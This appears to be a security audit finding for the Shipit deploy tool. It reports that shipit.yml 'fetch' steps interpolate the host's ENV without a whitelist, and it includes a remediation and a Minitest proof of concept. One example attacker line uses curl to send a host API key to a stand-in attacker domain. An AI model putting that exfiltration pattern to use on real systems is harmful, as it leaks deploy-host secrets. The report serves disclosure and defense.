### Title
Unrestricted `ENV` fallback in `fetch_deployed_revision` command interpolation exposes host secrets - (`lib/shipit/environment_variables.rb`, `lib/shipit/stack_commands.rb`, `app/models/shipit/deploy_spec.rb`)

### Summary
`Shipit::DeploySpec#fetch_deployed_revision_steps` (from a repository's `shipit.yml` `fetch` section) has no `variables`/whitelist mechanism, unlike `deploy_steps`/`rollback_steps`, which are filtered via `filter_deploy_envs`/`filter_rollback_envs` calling `EnvironmentVariables#permit`. `Shipit::StackCommands#fetch_deployed_revision` runs these unfiltered command lines through `Command#run`, whose `interpolate_environment_variables` calls `EnvironmentVariables#interpolate`, which falls back to the Shipit host's raw `ENV` for any `$VARIABLE` not present in the stack's own env hash, and the resulting stdout is surfaced as the stack's "currently deployed revision."

### Finding Description
The broken binding: the set of variables interpolatable in a `fetch` step should equal the set of variables explicitly declared/whitelisted for that step (as is done for deploy/rollback), i.e. `interpolatable_vars(fetch_step) == stack.env.keys ∩ fetch_variables_whitelist`. In reality `interpolatable_vars(fetch_step) == stack.env.keys ∪ Shipit_host_ENV.keys`, because no whitelist exists for the `fetch` section.

Code path:
- `DeploySpec#fetch_deployed_revision_steps`/`#fetch_deployed_revision_steps!` read the `fetch` key straight from the repo-controlled `shipit.yml` with no filtering: [1](#0-0) .
- Contrast with `deploy`/`rollback`, which have `deploy_variables`/`rollback_variables` and `filter_deploy_envs`/`filter_rollback_envs` calling `EnvironmentVariables#permit`: [2](#0-1) [3](#0-2) . No equivalent `fetch_variables`/`filter_fetch_envs` exists anywhere in the class.
- `StackCommands#fetch_deployed_revision` builds `Command.new(command_line, env:, chdir: dir).run` where `env` is `super.merge(@stack.env)` — the stack's configured env, not filtered by any fetch-specific whitelist: [4](#0-3) [5](#0-4) .
- `Command#run` → `interpolated_arguments` → `interpolate_environment_variables` → `EnvironmentVariables.with(env).interpolate(argument)`: [6](#0-5) [7](#0-6) .
- `EnvironmentVariables#interpolate` falls back to host `ENV[variable]` for any `$VARIABLE` token not present in the passed-in env hash: [8](#0-7) .

Attacker request: a contributor opens a PR (or pushes to a branch, depending on how the host wires up `shipit.yml` review) that sets `fetch: ['curl $INTERNAL_API_KEY https://attacker-controlled-or-example.com/version']` in `shipit.yml`. When `fetch_deployed_revision` is invoked (e.g., on stack page load or refresh), the command's argument is interpolated, `$INTERNAL_API_KEY` isn't in `@stack.env`, so it falls back to `ENV['INTERNAL_API_KEY']` from the Shipit host process, and the resolved command line is executed with that secret embedded, with `outputs.find(&:present?).try(:strip)` (the command's stdout) becoming `stack.last_deployed_revision`, displayed on the stack UI.

Why existing guards don't stop this: `EnvironmentVariables#permit`/`sanitize_env_vars` exist and are enforced for `deploy`/`rollback` env variables via `filter_deploy_envs`/`filter_rollback_envs`, but this whitelist is never invoked for `fetch` steps — `fetch_deployed_revision_steps` and `StackCommands#fetch_deployed_revision` bypass it entirely. `EnvironmentVariables#interpolate` itself has no whitelist check at all (only `permit` does), and it is `interpolate`, not `permit`, that runs for `fetch` steps.

### Impact Explanation
Any repository owner/contributor who can influence `shipit.yml` `fetch` steps (via PR merged into the tracked branch, or an unreviewed branch depending on host config) can cause the Shipit host process's arbitrary environment variables (secrets such as API keys, tokens, credentials present in the Shipit server's `ENV`) to be interpolated into a shell command and have its output reflected back through the "last deployed revision" surfaced on the stack page/API. This is repeatable per request/stack, does not require any Shipit privilege, and directly leaks host-level secrets outside the intended per-stack `env` whitelist mechanism — matching "exfiltration of deploy-time secrets" (Critical) since command execution and output disclosure both occur on the deploy host.

### Likelihood Explanation
Preconditions are modest: the attacker needs the ability to get a `fetch:` step into the evaluated `shipit.yml` for some stack (contributor PR merged, or direct push if branch protections/PR review aren't enforced by the host), and the targeted secret must exist as an environment variable on the Shipit host process. No Shipit session, API token, or GitHub secret is required. This is a straightforward, repeatable configuration-only attack once the PR is merged/the code path runs — feasibility is high given only a `shipit.yml` edit is needed.

### Recommendation
Introduce `fetch_variables` support in `DeploySpec` (analogous to `deploy_variables`/`rollback_variables`) and a `filter_fetch_envs` using `EnvironmentVariables#permit`; apply it in `StackCommands#fetch_deployed_revision` before building `Command.new`. Additionally, remove or gate the `ENV[variable]` fallback in `EnvironmentVariables#interpolate` so that variables not explicitly declared/whitelisted resolve to empty/error rather than silently falling back to the full host process environment.

### Proof of Concept
Minitest plan (`test/lib/shipit/stack_commands_test.rb`, matching existing test patterns):
```ruby
test "#fetch_deployed_revision leaks host ENV variable not declared in stack.yml" do
  stack = shipit_stacks(:shipit)
  ENV['INTERNAL_API_KEY'] = 'super-secret-value'
  spec = stub(fetch_deployed_revision_steps!: ['echo $INTERNAL_API_KEY'])
  DeploySpec::FileSystem.stubs(:new).returns(spec)
  stack_commands = StackCommands.new(stack)
  stack_commands.stubs(:with_temporary_working_directory).yields(Pathname.new('/tmp'))

  result = stack_commands.fetch_deployed_revision

  assert_equal 'super-secret-value', result
ensure
  ENV.delete('INTERNAL_API_KEY')
end
```
Binding assertion before/after fix: before, `result == ENV['INTERNAL_API_KEY']` (leak); after adding a `fetch_variables` whitelist, the same test should raise `EnvironmentVariables::NotPermitted` or produce an empty/blank interpolation instead of the secret value.
